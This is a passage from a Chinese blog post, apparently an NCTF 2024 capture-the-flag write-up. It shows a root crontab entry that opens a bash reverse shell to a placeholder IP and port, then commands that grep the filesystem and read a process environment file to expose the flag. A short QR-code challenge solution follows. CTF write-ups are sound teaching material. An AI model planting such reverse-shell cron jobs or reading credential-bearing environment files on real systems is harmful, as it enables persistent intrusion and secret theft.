<span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/sh

<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /bin/bash <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1'</span></code></pre>

<p>获得shell后寻找flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#linux命令：</span>
<span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-exec</span> <span class="token function">grep</span> <span class="token parameter variable">-l</span> <span class="token parameter variable">-i</span> <span class="token string">"nctf"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> + <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null

<span class="token comment">#Out:</span>
/proc/1/task/1/environ

<span class="token comment">#linux命令：</span>
<span class="token function">cat</span> /proc/1/task/1/environ

<span class="token comment">#Out：</span>
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME<span class="token operator">=</span>comp-xlcrypsc-67706716887745083pclt4FLAG<span class="token operator">=</span>nctf<span class="token punctuation">&#123;</span>760bd839-02ff-4b4f-b5a9-3b006910963a<span class="token punctuation">&#125;</span>KUBERNETES_PORT<span class="token operator">=</span>tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP<span class="token operator">=</span>tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP_PROTO<span class="token operator">=</span>tcpKUBERNETES_PORT_443_TCP_PORT<span class="token operator">=</span>443KUBERNETES_PORT_443_TCP_ADDR<span class="token operator">=</span><span class="token number">192.168</span>.0.1KUBERNETES_SERVICE_HOST<span class="token operator">=</span><span class="token number">192.168</span>.0.1KUBERNETES_SERVICE_PORT<span class="token operator">=</span>443KUBERNETES_SERVICE_PORT_HTTPS<span class="token operator">=</span>443HOME<span class="token operator">=</span>/root
</code></pre>

<h3 id="QRcode-Reconstruction"><a href="#QRcode-Reconstruction" class="headerlink" title="QRcode Reconstruction"></a>QRcode Reconstruction</h3><p><img src="/images/1742737001478-793cdfb8-490c-40bc-939e-41e4ccc41789.png" loading="lazy">手搓。</p>
<p>最后decode是</p>
<p><img src="/images/1742737035701-dfd8da36-52fa-4ed1-b08c-ee997cda532a.png" loading="lazy"></p>
<p>猜到flag是nctf{WeLc0mE_t0_Nctf_2024!!!}</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2></div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">吐刀乐！</div><div id="qr" style="display:none;"><div style="display:inline-block"></div><div style="display:inline-block"></div><div style="display:inline-block"></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>不知道</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://example.com/2025/04/14/NCTF24-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/" title="NCTF24 不知道 WP">http://example.com/2025/04/14/NCTF24-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/04/07/XYCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/" rel="next" title="XYCTF25 不知道 WP"><span class="post-nav-text">XYCTF25 不知道 WP</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>欢迎留言~</span><br></div><div class="toggle-comment-system" style="margin: 1rem auto"><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target="#waline" onclick="showComment(this.dataset.target)">waline</a><style>.utterances {
  display: none;
}</style><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target=".utterances" onclick="showComment(this.dataset.target)">utterances</a><script>function hideAllComment() {
  //- hide all
  document.querySelectorAll('.toggle-comment-btn').forEach((btn) => {
    const container = document.querySelector(btn.dataset.target);
    if (container) {
      container.style.display = "none";
    }
  });
}
function showComment(target) {
  hideAllComment();
  //- show target
  const targetContainer = document.querySelector(target);
  if (targetContainer) {
    targetContainer.style.display = "block";
  }
}
</script></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> 不知道</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a></body></html>